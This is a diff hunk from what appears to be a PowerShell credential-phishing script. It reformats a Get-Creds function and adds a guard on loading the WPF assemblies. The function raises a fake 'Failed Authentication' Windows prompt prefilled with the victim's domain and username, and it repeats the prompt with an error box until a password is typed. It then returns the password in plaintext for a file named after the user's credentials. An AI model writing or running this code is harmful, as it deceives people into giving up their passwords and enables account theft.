@@ -53,31 +53,34 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
-$form = $null
+    $form = $null
 
-while ($form -eq $null)
-{
-    $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
-    $cred.getnetworkcredential().password
-
-    if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+    while ($form -eq $null)
     {
-        Add-Type -AssemblyName PresentationCore,PresentationFramework
-	$msgBody = "Credentials cannot be empty!"
-	$msgTitle = "Error"
-	$msgButton = 'Ok'
-	$msgImage = 'Stop'
-	$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-	Write-Host "The user clicked: $Result"
-        $form = $null
-    }
-    
-    else{
-    $creds = $cred.GetNetworkCredential() | fl
-    return $creds
-    }
-}
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
 
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+        {
+            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
+            {
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+            }
+
+            $msgBody = "Credentials cannot be empty!"
+            $msgTitle = "Error"
+            $msgButton = 'Ok'
+            $msgImage = 'Stop'
+            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+            Write-Host "The user clicked: $Result"
+            $form = $null
+        }
+        
+        else{
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
+        }
+    }
 }
 
 #----------------------------------------------------------------------------------------------------
